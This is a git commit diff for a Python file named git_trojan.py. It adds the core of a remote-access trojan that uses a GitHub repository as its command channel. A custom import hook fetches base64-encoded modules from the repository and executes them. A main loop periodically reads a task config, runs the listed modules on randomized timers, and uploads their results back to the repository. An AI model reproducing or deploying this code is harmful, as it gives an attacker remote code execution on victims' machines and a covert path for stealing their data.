2a7b1e7fa20ab73b873f9c26391d63bb841466b5
Spiros Avlonitis <spirosa84@hotmail.com>
2019-01-03 21:34:42 +0200

    final code

--- git_trojan.py
+++ git_trojan.py
@@ -38,7 +38,7 @@ def get_file_contents(filepath):
 
     return None
 
-def get_trojan config():
+def get_trojan_config():
     global configured
 
     config_json = get_file_contents(trojan_config)
@@ -57,3 +57,46 @@ def store_module_result(data):
     repo.create_file(remote_path, "Commit Message", base64.b64encode(data))
 
     return
+
+class GitImporter(object):
+    def __init__(self):
+        self.current_module_code = ""
+
+    def find_module(self, fullname, path=None):
+        if configured:
+            print("[*] Attempting to retrive %s" % fullname)
+            new_library = get_file_contents("modules/%s" % fullname)
+
+            if new_library is not None:
+                self.current_module_code = base64.b64decode(new_library)
+                return self
+        return None
+
+    def load_module(self, name):
+        module = imp.new_module(name)
+        exec self.current_module_code in module.__dict__
+        sys.modules[name] = module
+
+        return module
+
+
+def module_runner(module):
+    task_queue.put(1)
+    result = sys.modules[module].run()
+
+    # store the result in our repo
+    store_module_result(result)
+
+    return
+
+# main trojan loop
+sys.meta_path = [GitImporter()]
+
+while True:
+    if task_queue.empty():
+        config = get_trojan_config()
+        for task in config:
+            t = threading.Thread(target=module_runner, args=(task['module'],))
+            t.start()
+            time.sleep(random.randint(1,10))
+    time.sleep(random.randint(1000,10000))
